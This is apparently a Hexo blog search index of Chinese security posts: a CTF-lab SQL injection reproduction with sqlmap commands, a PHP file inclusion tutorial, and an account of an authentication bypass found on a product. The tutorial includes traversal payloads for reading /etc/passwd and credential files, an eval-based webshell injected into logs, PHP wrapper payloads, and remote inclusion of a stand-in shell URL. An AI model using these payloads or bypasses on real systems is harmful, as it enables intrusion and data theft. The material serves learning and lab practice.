<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2022-32991</title>
      <link href="/2023/05/09/CVE-2022-32991/"/>
      <url>/2023/05/09/CVE-2022-32991/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>春秋云境：<a href="https://yunjing.ichunqiu.com/">https://yunjing.ichunqiu.com</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>该CMS的welcome.php中存在SQL注入攻击</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>0x01 打开环境</p><p> <img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212440176.png" alt="image-20230508212440176"></p><p>0x02 注册一个账号</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212529225.png" alt="image-20230508212529225"></p><p>0x03 登录账号</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212552189.png" alt="image-20230508212552189"></p><p>0x04 点击 Start</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212622366.png" alt="image-20230508212622366"></p><p>0x05 eid 就是存在注入参数</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212656364.png" alt="image-20230508212656364"></p><p>0x06 把URL复制下来 打开sqlmap 输入命令：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid –dbs –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508213918316.png" alt="image-20230508213918316"></p><p>0x07 爆列名：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid -D ctf –tables –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508213958018.png" alt="image-20230508213958018"></p><p>0x08 爆字段名：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid -D ctf -T flag –columns –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508214028385.png" alt="image-20230508214028385"></p><p>0x09 爆数据：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid -D ctf -T flag -C flag –dump –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508214056991.png" alt="image-20230508214056991"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2023/02/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/02/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h2><p>通过PHP函数引入文件时 传入的文件名没有经过合理的验证 从而操作了预想之外的文件 就可能导致意外的文件泄漏甚至恶意代码注入</p><h2 id="文件包含漏洞产生的原因"><a href="#文件包含漏洞产生的原因" class="headerlink" title="文件包含漏洞产生的原因"></a>文件包含漏洞产生的原因</h2><p>为了代码更灵活 开发人员通常会把被包含的文件设置为变量 进行动态调用 从而导致客户端可以调用任意文件 造成文件包含漏洞 动态包含的文件路径参数在客户端可控 web应用对用户的输入没有进行过滤</p><h2 id="文件包含漏洞特点"><a href="#文件包含漏洞特点" class="headerlink" title="文件包含漏洞特点"></a>文件包含漏洞特点</h2><p><strong>无视扩展名</strong></p><p>PHP中当使用上面的一些函数的时候 这个文件就会被当作PHP代码进行执行 PHP内核并不会在意包含的文件是什么类型的 也就是说当发过来的是.png的文件也会被当作PHP执行</p><p><strong>无条件解析php代码</strong></p><p>文件包含漏洞在读取源码的时候 若遇到符合PHP语法规范的代码 将会无条件执行</p><h2 id="文件包含漏洞危害"><a href="#文件包含漏洞危害" class="headerlink" title="文件包含漏洞危害"></a>文件包含漏洞危害</h2><ul><li><p>读取web配置文件以及敏感的数据</p></li><li><p>web服务器的文件被外界浏览导致信息泄露</p></li><li><p>与文件上传漏洞组合getshell，将恶意代码执行解析</p></li></ul><h2 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h2><p>include()：</p><ul><li>当使用该函数包含文件时 只有代码执行到include()函数时才将文件包含进来 发生错误时之给出一个警告 然后继续向下执行</li></ul><p>include_once()：</p><ul><li>功能和include()相同 区别在于当重复调用同一文件时 程序只调用一次</li></ul><p>require()：</p><ul><li>Require()与include()的区别在于require()执行如果发生错误 函数会输出错误信息 并终止脚本的运行。</li></ul><p>require_once()：</p><ul><li>功能与require()相同 区别在于当重复调用同一文件时 程序只调用一次。</li></ul><p>highlight_file()、show_source()：</p><ul><li>函数对文件进行语法高亮显示 通常能看到源代码</li></ul><p>readfile()、file_get_contents()：</p><ul><li>函数读取一个文件 并写入到输出缓冲</li></ul><p>fopen()：</p><ul><li>打开一个文件或者url</li></ul><h2 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h2><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><p>当被包含的文件在服务器本地时 就形成的本地文件包含漏洞</p><p>文件包含漏洞代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[name];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获取系统中的其他文件内容绝对路径 读取本地 host 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?filename=C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p>相对路径 读取本地 host 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?filename=..\..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p>包含图片马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?filename=./shell.png</span><br></pre></td></tr></table></figure><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>远程文件包含指的是能够包含远程服务器上的文件并执行 可以通过 http(s)或者 ftp 等方式 远程加载文件</p><p>在php.ini中需要满足两个条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include = On  （默认为 OFF，需要在 php.ini 中手动打开）</span><br><span class="line">allow_url_fopen = On    （是否允许打开远程文件）用户可以动态控制变量)</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞的利用方式"><a href="#文件包含漏洞的利用方式" class="headerlink" title="文件包含漏洞的利用方式"></a>文件包含漏洞的利用方式</h2><h3 id="敏感文件读取"><a href="#敏感文件读取" class="headerlink" title="敏感文件读取"></a>敏感文件读取</h3><p>读取敏感文件 就是将WEB服务器上一些其他文件读取出来 这些其他文件中可能包含一些敏感文件 私密文件或者是一些数据 表格等</p><h3 id="绝对路径读取"><a href="#绝对路径读取" class="headerlink" title="绝对路径读取"></a>绝对路径读取</h3><h4 id="windows敏感文件绝对路径"><a href="#windows敏感文件绝对路径" class="headerlink" title="windows敏感文件绝对路径"></a>windows敏感文件绝对路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\boot.ini                                  #查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml     #IIS配置文件</span><br><span class="line">C:\windows\repair\sam                        #存储Windows的密码</span><br><span class="line">C:\programFiles\mysql\my.ini                 #mysql配置文件 里面可能有密码</span><br><span class="line">C:\programFiles\mysql\data\mysql\user.MYD    #mysql root密码</span><br><span class="line">C:\windows\php.ini                           #php配置文件</span><br></pre></td></tr></table></figure><h4 id="linux敏感文件绝对路径"><a href="#linux敏感文件绝对路径" class="headerlink" title="linux敏感文件绝对路径"></a>linux敏感文件绝对路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd                                           #用户密码</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf                #apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf   #虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini                       #php相关设置        </span><br><span class="line">/etc/httpd/conf/httpd.conf                            #apache配置文件        </span><br><span class="line">/etc/my.cnf                                           #mysql配置文件</span><br><span class="line">/etc/sysconfig/iptables                               #查看防火墙策略</span><br></pre></td></tr></table></figure><h3 id="相对路径读取"><a href="#相对路径读取" class="headerlink" title="相对路径读取"></a>相对路径读取</h3><p>相对利用读取方式就需要使用  ..&#x2F;  来进行读取 一次  ..&#x2F;  向后退一次</p><h3 id="包含图片马getshell"><a href="#包含图片马getshell" class="headerlink" title="包含图片马getshell"></a>包含图片马getshell</h3><p>文件上传限制了后缀名jpg&#x2F;png 可以上传一张jpg或者png的图片马 即在图片中写入php木马 然后上传 获取上传的图片位置 通过文件包含刚刚你上传的图片马获取websehll</p><h3 id="包含日志getshell"><a href="#包含日志getshell" class="headerlink" title="包含日志getshell"></a>包含日志getshell</h3><p>中间件例如 iis 、apache、nginx 这些 web 中间件 都会记录访问日志 如果访问日志中或错误日志中 存在有 php 代码 也可以引入到文件含中 如果日志有 php 恶意代码 也可导致 getshell </p><p>使用 burpsuite 访问 GET 填写 <?php phpinfo();eval($_POST[cmd]);?></p><p>在 linux 下日志文件权限默认是 root 而 php 的权限是 www-data 一般情况下都是读取不了 如果是 windows环境下是可以权限是允许的</p><p>把文件日志包含进来即可</p><p>linux 默认的 apache 日志文件路径：</p><ul><li>访问日志：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</li><li>错误日志：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</li></ul><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><table><thead><tr><th align="center">协议</th><th align="center">php版本</th><th align="center">allow_url_fopen</th><th align="center">aloow_url_include</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">file:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">访问本地文件系统</td></tr><tr><td align="center">php:&#x2F;&#x2F;input</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">访问请求的原始数据的只读流</td></tr><tr><td align="center">zlib:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">压缩流</td></tr><tr><td align="center">data:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">on</td><td align="center">on</td><td align="center">数据（RFC2397）</td></tr><tr><td align="center">php:&#x2F;&#x2F;filter</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php:是php中独有的一种协议 是一种过滤器 可以作为一个中间流来过滤其他的数据流 通常使用该协议来读取或者写入部分数据 且在读取和写入之前对数据进行一些过滤</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://input   可以通过POST方法操作PHP输入流 导致任意命令执行</span><br><span class="line">php://filter  可以读取PHP文件 造成源码泄露</span><br></pre></td></tr></table></figure><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流 将 post 请求的数据当作 php 代码执行 当传入的参数作为文件名打开时 可以将参数设为php:&#x2F;&#x2F;input 同时 post 想设置的文件内容 php 执行时会将 post 内容当作文件内容<br>当 enctype&#x3D;”multipart&#x2F;form-data” php:&#x2F;&#x2F;input 是无效的<br>条件：allow_url_fopen &#x3D;ON allow_url_include&#x3D;ON</p><h4 id="file-x2F-x2F-访问本地文件"><a href="#file-x2F-x2F-访问本地文件" class="headerlink" title="file:&#x2F;&#x2F; 访问本地文件"></a>file:&#x2F;&#x2F; 访问本地文件</h4><p>本地包含漏洞里可以使用 file 协议 使用 file 协议可以读取本地文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file:///etc/passwd</span><br></pre></td></tr></table></figure><h4 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h4><p>php:&#x2F;&#x2F;  用于访问各个输入&#x2F;输出流（I&#x2F;O streams） 经常使用的是 php:&#x2F;&#x2F;filter 和 php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter  用于读取源码<br>php:&#x2F;&#x2F;input  用于执行 php 代码</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php:&#x2F;&#x2F;input</td><td>可以访问请求的原始数据的只读流 在 POST 请求中访问 POST 的 data 部分 在enctype&#x3D;”multipart&#x2F;form-data” 的时候php:&#x2F;&#x2F;input 是无效的</td></tr><tr><td>php:&#x2F;&#x2F;outpu</td><td>写的数据流 允许以 print 和 echo 一样的方式写入到输出缓冲区</td></tr><tr><td>php:&#x2F;&#x2F;f</td><td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符 例如php:&#x2F;&#x2F;fd&#x2F;3 引用了文件描述符</td></tr><tr><td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;tem</td><td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流 允许读写临时数据 两者的唯一区别是 php:&#x2F;&#x2F;memory 总是把数据储存在内存中 而 php:&#x2F;&#x2F;temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中 临时文件位置的决定和 sys_get_temp_dir()的方式一致</td></tr><tr><td>php:&#x2F;&#x2F;filt</td><td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用 对于一体式（all-in-one）的文件函数非常有用 类似 readfile()、file() 和file_get_contents() 在数据流内容读取之前没有机会应用其他过滤器</td></tr></tbody></table><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>参数详解</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="center">必须 它指定了你要筛选过滤的数据流</td></tr><tr><td align="center">read&#x3D;&lt;读链的过滤器&gt;</td><td align="center">该参数可选 可以设定一个或多个过滤器名称 以管道符(|)分割</td></tr><tr><td align="center">write&#x3D;&lt;写链的筛选列表&gt;</td><td align="center">该参数可选 可以设定一个或多个过滤器名称 以管道符(|)分割</td></tr><tr><td align="center">&lt;; 两个链的过滤器&gt;</td><td align="center">任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><p>可用的过滤器列表（4 类）</p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于 str_rot13() rot13 变换</td></tr><tr><td>string.toupper</td><td>等同于 strtoupper() 转大写字母</td></tr><tr><td>string.tolower</td><td>等同于 strtolower() 转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于 strip_tags() 去除 html PHP 语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp;  convert.base64-decode</td><td>等同于 base64_encode()和base64_decode()  base64 编码解码</td></tr><tr><td>bzip2.compress &amp;  bzip2.decompress</td><td>bzip2.decompress 同上 在本地文件系统中创建bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><p>利用：</p><p>读取文件源码 以base64编码的格式读取到页面 读取文件后再进行 base64 解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="phar-x2F-x2F-zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F"><a href="#phar-x2F-x2F-zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;  zip:&#x2F;&#x2F;  bzip2:&#x2F;&#x2F;  zlib:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;  zip:&#x2F;&#x2F;  bzip2:&#x2F;&#x2F;  zlib:&#x2F;&#x2F;</h4><p>用于读取压缩文件 zip:&#x2F;&#x2F;  bzip2:&#x2F;&#x2F;  zlib:&#x2F;&#x2F;  均属于压缩流 可以访问压缩文件中的子文件 更重要的是不需要指定后缀名 可修改为任意后缀  jpg  png  gif  xxx 等等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br><span class="line"></span><br><span class="line">zip://[ 压 缩 文 件 绝 对 路 径 ]%23[ 压 缩 文 件 内 的 子 文 件 名 ]（# 编 码 为 %23）</span><br><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br><span class="line"></span><br><span class="line">compress.bzip2://file.bz2 http://127.0.0.1/include.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg http://127.0.0.1/include.php?file=compress.bzip2://./file.jpg</span><br><span class="line"></span><br><span class="line">compress.zlib://file.gz http://127.0.0.1/include.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg http://127.0.0.1/include.php?file=compress.zlib://./file.jpg</span><br></pre></td></tr></table></figure><p><strong>data:&#x2F;&#x2F; 协议</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> data://text/plain, http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64, http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>远程文件包含是指开发人员未限制包含的文件对象  加上PHP的不合理配置 导致程序包含了其它域（网站）中的危险脚本的漏洞 其本质是使用PHP伪协议进行包含</p><p>条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=On</span><br><span class="line">allow_url_include=ON</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/shell.php为危险脚本的URL</span><br><span class="line">http://127.0.0.1/index.php?filename=http://www.xxx.com/shell.php</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞绕过"><a href="#文件包含漏洞绕过" class="headerlink" title="文件包含漏洞绕过"></a>文件包含漏洞绕过</h2><h3 id="本地文件包含绕过"><a href="#本地文件包含绕过" class="headerlink" title="本地文件包含绕过"></a>本地文件包含绕过</h3><p><strong>超长字符绕过</strong></p><p>可以使用 （\.） 进行截断和 （.）</p><p>php 版本小于 5.2.8 可以成功 linux 需要文件名长于 4096 windows 需要长于 256利用操作系统对目录最大长度限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=shell.jpg............................................</span><br><span class="line">.............................................................................................</span><br><span class="line">.............................................................................................</span><br><span class="line">....</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=shell.jpg%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e% 2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f</span><br><span class="line">%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e% 2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f</span><br><span class="line">%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e% 2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e</span><br></pre></td></tr></table></figure><h3 id="远程文件包含绕过"><a href="#远程文件包含绕过" class="headerlink" title="远程文件包含绕过"></a>远程文件包含绕过</h3><table><thead><tr><th align="center">符号</th><th align="center">url 编码</th></tr></thead><tbody><tr><td align="center">#</td><td align="center">%23</td></tr><tr><td align="center">?</td><td align="center">%3f</td></tr><tr><td align="center">00</td><td align="center">%00</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=http://www.xxx.com/shell.txt#</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/file.php?file=http://www.xxx.com/shell.txt?</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/file.php?file=http://www.xxx.com/shell.txt00</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h2><ul><li><p>php中使用open_basedir配置限制访问在指定的区域过滤；</p></li><li><p>过滤特殊字符如<code>（点)/(正斜杠)\(反斜杠)</code>;</p></li><li><p>禁止服务器远程文件包含;</p></li><li><p>尽量不要使用动态包含，可以在需要包含的页面固定写好.</p></li><li><p>配置php.ini配置文件</p></li><li><p>设置黑白名单</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次未授权访问加逻辑缺陷通用漏洞</title>
      <link href="/2022/12/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8A%A0%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8A%A0%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次未授权访问加逻辑缺陷通用漏洞"><a href="#记一次未授权访问加逻辑缺陷通用漏洞" class="headerlink" title="记一次未授权访问加逻辑缺陷通用漏洞"></a>记一次未授权访问加逻辑缺陷通用漏洞</h1><p>进入到登录界面</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203000014102.png" alt="image-20221203000014102"></p><p>首先来尝试几个弱口令</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203000055385.png" alt="image-20221203000055385"></p><p>emm</p><p>弱口令不行那试试注入</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203000342271.png" alt="image-20221203000342271"></p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203000439082.png" alt="image-20221203000439082"></p><p>好像也没法注入</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/0cc0506d19acf54510e88eaa329d715.jpg"></p><p>右键查看一下源码</p><p>发现一个登录成功跳转的地址</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203000713488.png" alt="image-20221203000713488"></p><p>拼接一下url</p><p>本来没报啥希望的</p><p>没想到</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203000909386.png" alt="image-20221203000909386"></p><p>直接进去了</p><p>点击一下日志</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203001216062.png" alt="image-20221203001216062"></p><p>未授权有了</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/848cd2f4e9137cf16d64615ef42b015.jpg"></p><p>再测测还有没有其它漏洞</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203001424844.png" alt="image-20221203001424844"></p><p>日志页面的地址</p><p>试试再拼接一下url</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203001613778.png" alt="image-20221203001613778"></p><p>也能直接访问</p><p>继续测</p><p>在登录处输入任意的账号密码</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203001737784.png" alt="image-20221203001737784"></p><p>抓包</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203001825189.png" alt="image-20221203001825189"></p><p>然后</p><p>拦截返回包</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203001930677.png" alt="image-20221203001930677"></p><p>之前在页面源码处发现当result&#x3D;&#x3D;0时是登录成功</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203002017722.png" alt="image-20221203002017722"></p><p>把1改为0</p><p>也成功跳转了</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203002258843.png" alt="image-20221203002258843"></p><p>逻辑缺陷又有了</p><p>然后就是查资产</p><p>刚好5000w</p><p>案例也够</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203002637824.png" alt="image-20221203002637824"></p><p>这下可以水两个证书了</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/aff42ce946f78d14de92b4ba8b3fcf5.jpg"></p><p>高高兴兴写完漏洞报告提交</p><p>等过几天一看</p><p>我裂开</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/9eab38e137478fe2a12f0d36b116d9d.jpg"></p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203002802987.png" alt="image-20221203002802987"></p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20221203002851847.png" alt="image-20221203002851847"></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的算法</title>
      <link href="/2022/10/13/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%97%E6%B3%95/"/>
      <url>/2022/10/13/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%97%E6%B3%95/</url>
      
